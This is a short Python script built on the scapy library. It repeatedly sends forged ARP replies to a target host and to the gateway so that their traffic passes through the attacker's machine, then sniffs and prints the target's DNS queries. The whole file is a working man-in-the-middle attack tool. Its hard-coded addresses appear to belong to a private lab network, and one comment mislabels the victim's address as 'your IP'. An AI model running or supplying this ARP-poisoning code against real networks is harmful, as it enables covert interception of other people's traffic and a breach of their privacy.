import logging
from scapy.all import ARP, send, sniff, getmacbyip
from scapy.layers.dns import DNS, DNSQR, IP
import threading
import time

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def arp_spoof(target_ip, spoof_ip):
    try:
        target_mac = getmacbyip(target_ip)  # Get the target's MAC address
        if target_mac is None:
            print(f"Could not find MAC address for {target_ip}")
            return
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        send(packet, verbose=False)
        print(f"Sent ARP packet to {target_ip} ({target_mac}) claiming {spoof_ip} is at our MAC address")
    except Exception as e:
        print(f"Error in arp_spoof: {e}")

def dns_packet(packet):
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
        ip_src = packet[IP].src
        dns_query = packet[DNSQR].qname.decode()
        print(f"{ip_src:<15} \t {dns_query:<30}")

def start_arp(target_ip, gateway_ip):
    while True:
        arp_spoof(target_ip, gateway_ip)
        arp_spoof(gateway_ip, target_ip)
        time.sleep(2)  # Add a delay

# Replace these with your IP and gateway IP
target_ip = "192.168.72.132"  # Your IP address
gateway_ip = "192.168.72.2"   # Your gateway IP

# Start ARP spoofing in a separate thread
threading.Thread(target=start_arp, args=(target_ip, gateway_ip), daemon=True).start()

print("[+] Network Traffic : 2025")
print("-" * 40)
print(f"{'IP Address':<15} \t {'DNS Query':<30}")
print("-" * 40)

# Start sniffing DNS traffic
try:
    sniff(filter="udp port 53", prn=dns_packet, store=0)
except PermissionError:
    print("Permission denied. Run the script with sudo.")
except Exception as e:
    print(f"Error in sniff: {e}")